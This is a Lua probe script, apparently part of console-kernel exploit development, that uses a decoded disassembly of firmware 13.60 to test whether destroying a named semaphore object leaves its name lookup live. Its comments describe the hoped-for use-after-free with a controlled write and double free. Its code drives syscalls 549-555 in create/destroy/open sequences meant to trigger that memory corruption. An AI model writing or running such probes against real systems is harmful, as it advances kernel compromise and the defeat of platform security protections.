-- CRASH_CLASS: MODERATE
-- PROBE 825a: does destroying an osem object leave its name lookup live?
--
-- Context (13.60 decode, base = file offset inside docs/dumps_13.60/kernel_text.bin):
--   549 create   @0xC16020  flags&0x100 -> [obj+0x54]=1 and name-table insert 0x8b354870
--                           register(table, 0x120, obj, name); id returned in RAX
--   550 destroy  @0xC16270  lookup(table,id,0x120); remove entry; unlock;
--                           test byte [obj+0x45],1 -> name-table remove 0x8b354a10;
--                           dec [obj+0x54]; free when it reaches zero
--   551 open     @0xC16720  copyin(name) -> 0x8b354d80(&buf,0x120,&out) looks up BY NAME,
--                           inc [obj+0x54], allocate a second id, register it, return it
--   552 destroy  @0xC16880  same shape as 550 (type 0x120, refcount [obj+0x54])
--
-- If the name entry survives the free (different flag field, or the remove is
-- conditional on something the create did not set), then 551 returns a pointer
-- to freed memory, increments its refcount and hands out a new id: a UAF with a
-- controlled write and a second free behind it.

print("=== PROBE 825a: osem name lookup after destroy ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc552 = make_syscall(552)
local sc555 = make_syscall(555)

-- [A] path 1: create with the name flag, destroy every id, then ask for the name
local n1 = mkname("oberon1")
local ok, idA = pcall(function() return sc549(n1, uint64(0x101), uint64(0), uint64(0x1000)) end)
idA = to_num(idA or 0)
print(string.format("[A] 549(name,0x101,0,0x1000) ok=%s id=%s", tostring(ok), hx(idA)))

local okB, rB = pcall(function() return sc550(uint64(idA)) end)
print(string.format("[B] 550(%s) ok=%s ret=%s", hx(idA), tostring(okB), hx(rB)))

local okC, rC = pcall(function() return sc551(n1) end)
print(string.format("[C] 551(name) after destroy own id -> ok=%s ret=%s", tostring(okC), hx(rC)))

if to_num(rC or 0) > 0 then
    local idB = to_num(rC)
    local okD, rD = pcall(function() return sc555(uint64(idB), uint64(1)) end)
    print(string.format("[D] 555(idB=%s,1) ok=%s ret=%s", hx(idB), tostring(okD), hx(rD)))
    local okE, rE = pcall(function() return sc550(uint64(idB)) end)
    print(string.format("[E] 550(idB=%s) ok=%s ret=%s", hx(idB), tostring(okE), hx(rE)))
else
    print("[D] skipped: the name lookup refused")
    print("[E] skipped: the name lookup refused")
end

-- [F] path 2: two ids for one object, destroy both, then ask for the name again
local n2 = mkname("oberon2")
local ok2, idC = pcall(function() return sc549(n2, uint64(0x101), uint64(0), uint64(0x1000)) end)
idC = to_num(idC or 0)
print(string.format("[F] 549(name,0x101,0,0x1000) id=%s", hx(idC)))
local ok3, r3 = pcall(function() return sc551(n2) end)
local idD = to_num(r3 or 0)
print(string.format("[F] 551(name) -> ret=%s", hx(r3)))
local ok4, r4 = pcall(function() return sc552(uint64(idC)) end)
print(string.format("[G] 552(%s) ret=%s", hx(idC), hx(r4)))
local ok5, r5 = pcall(function() return sc552(uint64(idD)) end)
print(string.format("[H] 552(%s) ret=%s", hx(idD), hx(r5)))
local ok6, r6 = pcall(function() return sc551(n2) end)
print(string.format("[I] 551(name) after both ids destroyed -> ret=%s", hx(r6)))
if to_num(r6 or 0) > 0 then
    local ok7, r7 = pcall(function() return sc555(uint64(to_num(r6)), uint64(2)) end)
    print(string.format("[J] 555(%s,2) ret=%s", hx(to_num(r6)), hx(r7)))
end

-- [K] health
local n3 = mkname("oberon3")
local ok8, r8 = pcall(function() return sc549(n3, uint64(1), uint64(0), uint64(0x100)) end)
print(string.format("[K] health 549 %s alive=true", hx(r8)))
print("=== PROBE 825a COMPLETE ===")
